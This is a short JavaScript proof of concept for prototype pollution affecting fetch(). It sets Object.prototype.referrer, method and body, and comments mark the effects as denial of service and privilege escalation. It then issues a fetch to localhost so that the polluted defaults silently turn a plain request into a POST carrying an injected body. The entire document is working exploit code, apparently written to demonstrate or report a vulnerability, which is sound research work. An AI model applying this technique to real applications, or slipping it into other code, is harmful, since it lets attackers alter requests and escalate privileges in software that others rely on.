Object.prototype.referrer = 'http://google.com';    // DoS
Object.prototype.method = "POST"                    // EoP
Object.prototype.body = "AAA"                       // EoP

fetch('http://localhost:3000')